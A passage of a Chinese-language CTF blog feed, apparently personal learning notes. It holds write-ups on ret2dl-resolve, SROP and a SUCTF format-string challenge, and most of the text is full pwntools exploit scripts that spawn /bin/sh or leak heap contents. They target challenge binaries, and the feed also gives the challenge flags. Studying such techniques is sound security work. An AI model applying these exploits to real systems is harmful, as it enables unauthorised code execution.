p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;write\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8712.png" alt></p><p>Part 6<br>把write改成system来getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>就可以成功getshell了！！！</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8713.png" alt></p><p>完整exp</p><figure class="highlight plain"><figcaption><span>python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 2   system(&apos;/bin/sh&apos;)</span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += fake_reloc # stack_addr+28</span><br><span class="line">payload2 += &apos;A&apos; * align</span><br><span class="line">payload2 += fake_sym # stack_addr+36+align</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位&lt;/p&gt;
&lt;p&gt;控制程序执行 dl_resolve 函数&lt;br&gt;    给定 Link_map 以及 index 两个参数。&lt;br&gt;    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。&lt;br&gt;控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。&lt;br&gt;伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。&lt;br&gt;伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>srop</title>
    <link href="https://c0yo7e.github.io/2019/09/02/srop/"/>
    <id>https://c0yo7e.github.io/2019/09/02/srop/</id>
    <published>2019-09-02T15:51:52.000Z</published>
    <updated>2020-08-02T05:13:28.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p><p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%871.png" alt></p><a id="more"></a><p>这里懂了，大概的原理就懂了一点了（其实我很懵）<br>然后看到了我们的smallest</p><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%872.png" alt></p><p>整个程序只有start函数，没办法调用write和puts这些来leak stack_addr，这就要用到我们的srop了。</p><p>首先看懂我们的程序到底在干啥，貌似是在执行read函数，但是我们在gdb里跑一遍是可以发现我们下一步是没有操作了的。然后我们知道read和write函数只是第一个参数不一样，那我们就改一下rax的值，看到有xor 操作就知道它置零了rax，我们要做的就是绕过那一步</p><p>那我们先让程序到start最开始的地方，即0x4000b0的地方，然后直接更改低位地址为b3，绕过置零的步骤，就成功调用write了，在leak之后我们还要返回这个程序，所以要再填入一个0x4000b0<br>所以第一步我们发送三个起始地址实现leak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(start_addr) * 3</span><br></pre></td></tr></table></figure><p>在实现leak之后就要想办法把execve（‘/bin/sh’,0,0）写入栈里，最后再实现调用</p><p>然后我们知道<code>rax</code>这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制<code>rax</code>寄存器的值。（其实我不知道的，所以看大佬wp的时候还一脸懵，不知道为啥非要填15个字符，想着又不是格式化字符串，看来还是我太菜了）<br>然后我们将<code>rax</code>寄存器设置成15（sigreturn的系统调用号），然后调用一个<code>syscall</code>，这个效果就和调用一个<code>sigreturn</code>是一样一样的（所以在额外我们再次写入了syscall）</p><p>所以第二步是利用sigreturn构造read的frame，第三步是往栈里写入execve（‘/bin/sh’,0,0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">#把frame写入栈中</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)  </span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br></pre></td></tr></table></figure><p>完整的exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">small = ELF(&apos;./smallest&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    sh = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    sh = process(&apos;./smallest&apos;)</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">syscall_ret = 0x00000000004000BE</span><br><span class="line">start_addr = 0x00000000004000B0</span><br><span class="line">## set start addr three times</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">sh.send(payload)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">## modify the return addr to start_addr+3</span><br><span class="line">## so that skip the xor rax,rax; then the rax=1</span><br><span class="line">## get stack addr</span><br><span class="line">sh.send(&apos;\xb3&apos;)</span><br><span class="line">stack_addr = u64(sh.recv()[8:16])</span><br><span class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">## make the rsp point to stack_addr</span><br><span class="line">## the frame is read(0,stack_addr,0x400)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x150  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x150 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%873.png" alt><br>放一张23R3F大佬的理解过程图，写得很明了了<br>（不过关于p64(0)的地方为什么会变成syscall那长度为0xf的东西，我真的没理解到，感觉那个东西只是作为返回值，然后长度传给了rax，然后我一直以为p64（0）只是为了让frame如从上上图的结构，看来还得继续学习理解啊）</p><p>感觉srop就粗略的通过这题过了一下子，很多关于机制和寄存器的原理还是有点懵，底层知识还不扎实，要好好补补了</p><p>相关参考链接:<br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a>  srop的原理<br><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">https://www.jianshu.com/p/b838a10b63c7</a>  23R3F师傅的wp</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Srop&quot;&gt;&lt;a href=&quot;#Srop&quot; class=&quot;headerlink&quot; title=&quot;Srop&quot;&gt;&lt;/a&gt;Srop&lt;/h2&gt;&lt;p&gt;Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）&lt;/p&gt;
&lt;p&gt;偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）&lt;br&gt;&lt;img src=&quot;/2019/09/02/srop/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>suctf的两三题wp</title>
    <link href="https://c0yo7e.github.io/2019/08/20/playfmt/"/>
    <id>https://c0yo7e.github.io/2019/08/20/playfmt/</id>
    <published>2019-08-20T14:58:39.000Z</published>
    <updated>2020-08-02T05:19:58.734Z</updated>
    
    <content type="html"><![CDATA[<p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p><p>以下附上超级简单题的一些思路，当做给自己的记录吧</p><a id="more"></a><h2 id="MT-crpyto"><a href="#MT-crpyto" class="headerlink" title="MT - crpyto"></a>MT - crpyto</h2><p>这是个密码题，但是我re基础有点太弱了，纯靠逆估计得逆很久，那就选择爆破吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int convert(unsigned int m) &#123;</span><br><span class="line">    m = m ^ m &gt;&gt; 13;</span><br><span class="line">    m = m ^ m &lt;&lt; 9 &amp; 2029229568ll;</span><br><span class="line">    m = m ^ m &lt;&lt; 17 &amp; 2245263360ll;</span><br><span class="line">    m = m ^ m &gt;&gt; 19;</span><br><span class="line">    return m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    for (i = 0; i &lt;= (unsigned int)0xffffffffll; i++) &#123;</span><br><span class="line">        if (i &amp; 0xfffff == 0)</span><br><span class="line">            printf(&quot;%u\n&quot;, i);</span><br><span class="line">        if (convert(i) == (unsigned int)1679057065ll) &#123;</span><br><span class="line">            printf(&quot;%u&quot;, i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//1679057065       2226413449</span><br><span class="line">//3818208026       2938293886</span><br><span class="line">//2854351778       1730632668</span><br></pre></td></tr></table></figure><p>我们发现这道题就是把给的最终结果的flag切片，四个四个以字符的形式（两个十六进制数为一个）一循环，往函数里进行异或和位移操作</p><p>写python脚本的时候，崩溃了，跑不出来（能读的位太小？还是我python不熟啊？）换个c发现巨方便 </p><p>falg : 84B45F89AF22CE7E67275BDC<br>大写发现过不去，改成小写就可以了<br>flag{84b45f89af22ce7e67275bdc} </p><h2 id="signup-re"><a href="#signup-re" class="headerlink" title="signup - re"></a>signup - re</h2><p>天知道第一道逆向竟然是rsa（看见熟悉的65537就知道了）<br>把n丢到网站上分出两个质数<br>然后直接丢给解rsa的脚本跑一下就出flag了（脚本来自超级可爱的队友，这里就不po出来了）</p><p>flag是suctf{Pwn_@_hundred_years}</p><h2 id="Playfmt-pwn"><a href="#Playfmt-pwn" class="headerlink" title="Playfmt - pwn"></a>Playfmt - pwn</h2><p>这道题，格式化字符串<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%871.png" alt><br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%872.png" alt></p><p>看到这里觉得有些眼熟，这不是lab9的那个差不多吗，关键函数，漏洞位置都一样，然后我天真的以为可以套着lab9的方法做这道题，结果…我确实天真，写完脚本，疯狂get不到shell，发现地址没爆错啊，啥都没问题，那肯定是got表改不了的问题了，这个具体看程序函数，貌似是那个this指针？（this+1是指向flag的）</p><p>看程序就知道，flag是被读进了堆里，堆的地址，我不会分析，就直接爆破吧</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%873.png" alt></p><p>偏移为6的位置作为第一个ebp，指向下一个地址，而下一个又指向了再下一个地址。偏移分别为6 、14 、26，蓝色字体的地址为heap的地址，选择爆破的话，泄露那个应该都OK<br>我们知道flag是被写进堆里的，我们就把heap的地址存入ebp指向的地址处，同时会被存进26个偏移的位置（方便读取数据）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[&apos;printf&apos;]</span><br><span class="line">system_libc = libc.symbols[&apos;system&apos;]  </span><br><span class="line">printf_libc = libc.symbols[&apos;printf&apos;]  </span><br><span class="line"></span><br><span class="line">def read_addr(target_addr):</span><br><span class="line">    index1 = 6   #偏移是6的地方作为第一个ebp</span><br><span class="line">    index2 = 14   #偏移是14的地方作为ebp2     --&gt;   ebp里存的是ebp2的地址</span><br><span class="line">    value_ls = map(ord, p32(target_addr))</span><br><span class="line">    low_byte = stack_addr &amp; 0xff</span><br><span class="line">for i in range(4):   </span><br><span class="line">#stack地址就为ebp2处的地址，不变，heap的地址存在ebp2里，ebp2会指向ebp3，所以地址同时写入ebp3中</span><br><span class="line">#我对这个的理解是：第一处的payload代表每个ebp里的字节存入单字节heap的地址</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(low_byte + i, index1)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line">        payload = &apos;%&#123;&#125;c%&#123;&#125;$hhn\n\x00&apos;.format(value_ls[i], index2)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvline()</span><br><span class="line"></span><br><span class="line">    success(&apos;target &apos; + hex(target_addr))</span><br><span class="line">    payload = &apos;%26$p\n\x00&apos;   #ebp2指向的地址处，只存放target_addr，可直接读取</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    payload = &apos;%26$s\n\x00&apos;</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;.%14$p.%18$p.\x00&apos;    #%19$p也可</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">p.recvuntil(&quot;.&quot;)</span><br><span class="line">heap_addr = int(p.recv(9),16)</span><br><span class="line"></span><br><span class="line">success(&apos;stack &apos; + hex(stack_addr))</span><br><span class="line">success(&apos;heap &apos; + hex(heap_addr))</span><br><span class="line">for i in range(-0x1000, 0, 0x4):      </span><br><span class="line">#这里就随意循环heap的地址，找到flag字符，然后打印出来即可</span><br><span class="line">        success(&apos;offset &apos; + hex(i))</span><br><span class="line">        read_addr(heap_addr + i)</span><br><span class="line">        ret = p.recvline()</span><br><span class="line">        if &apos;suctf&apos; in ret:</span><br><span class="line">            print(ret)</span><br><span class="line">            p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后找大佬问了一下怎么确定flag到底写在了哪里，发现是我自己c和数据结构没学好……果然逆向基础和代码基础还是很重要的（一句话，我太菜了）</p><p>V5是new出来的一个堆，这里的传参为this指针，v8是flag读入的堆，这里是a2（*this+1）</p><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%874.png" alt><br>Ida里找各个值的地址啥的<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%875.png" alt><br>New出来的v3为this，地址为[heap]0x08810E30<br><img 